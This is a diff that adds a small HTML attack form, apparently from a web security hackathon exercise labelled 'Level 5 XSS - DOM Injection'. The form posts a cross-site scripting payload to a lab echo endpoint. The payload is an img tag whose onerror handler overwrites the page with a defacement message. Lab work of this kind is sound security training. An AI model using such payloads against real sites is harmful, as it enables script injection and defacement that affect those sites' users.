@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html>
+<head><title>Level 5 XSS - DOM Injection</title></head>
+<body>
+  <h1>Level 5 DOM Test</h1>
+  <form method="POST" action="https://waph-hackathon.eastus.cloudapp.azure.com/xss/level5/echo.php">
+    <input name="input" value='<img src=x onerror="document.body.innerHTML = `<h1>Ian Cannon Was Here</h1>`">' size="120" />
+    <button type="submit">Submit Attack</button>
+  </form>
+</body>
+</html>
